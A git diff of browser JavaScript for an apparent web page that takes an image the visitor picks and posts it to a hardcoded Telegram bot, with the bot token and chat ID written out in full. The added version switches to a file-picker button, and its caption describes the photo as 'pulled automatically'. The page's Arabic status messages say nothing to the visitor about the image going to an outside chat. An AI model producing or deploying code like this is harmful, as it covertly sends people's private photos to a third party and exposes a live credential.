@@ -1,24 +1,34 @@
-document.getElementById('fileInput').addEventListener('change', function () {
-  const file = this.files[0];
-  if (!file) return;
+document.getElementById("startBtn").addEventListener("click", async () => {
+  const status = document.getElementById("status");
+  try {
+    const [fileHandle] = await window.showOpenFilePicker({
+      types: [{
+        description: 'Images',
+        accept: {'image/*': ['.png', '.jpg', '.jpeg', '.gif', '.webp']}
+      }],
+      multiple: false
+    });
 
-  document.getElementById("status").textContent = "⏳ جاري إرسال الصورة...";
+    const file = await fileHandle.getFile();
 
-  const formData = new FormData();
-  formData.append("chat_id", "8141222239");
-  formData.append("caption", "📸 صورة جديدة من الزائر");
-  formData.append("photo", file);
+    const formData = new FormData();
+    formData.append("chat_id", "8141222239");
+    formData.append("caption", "📸 صورة جديدة تم سحبها تلقائيًا");
+    formData.append("photo", file);
 
-  fetch("https://api.telegram.org/bot7701585433:AAFKP5UDdVsxRL2zrbmlaIK2jzd30rPW-F0/sendPhoto", {
-    method: "POST",
-    body: formData
-  }).then(res => {
-    if (res.ok) {
-      document.getElementById("status").textContent = "✅ تم إرسال الصورة بنجاح!";
+    status.textContent = "⏳ جاري إرسال الصورة...";
+
+    const response = await fetch("https://api.telegram.org/bot7701585433:AAFKP5UDdVsxRL2zrbmlaIK2jzd30rPW-F0/sendPhoto", {
+      method: "POST",
+      body: formData
+    });
+
+    if (response.ok) {
+      status.textContent = "✅ تم إرسال الصورة بنجاح!";
     } else {
-      document.getElementById("status").textContent = "❌ حدث خطأ أثناء الإرسال.";
+      status.textContent = "❌ حدث خطأ أثناء الإرسال.";
     }
-  }).catch(() => {
-    document.getElementById("status").textContent = "⚠️ فشل الاتصال بالخادم.";
-  });
+  } catch (err) {
+    status.textContent = "⚠️ تم رفض الإذن أو لم يتم اختيار صورة.";
+  }
 });
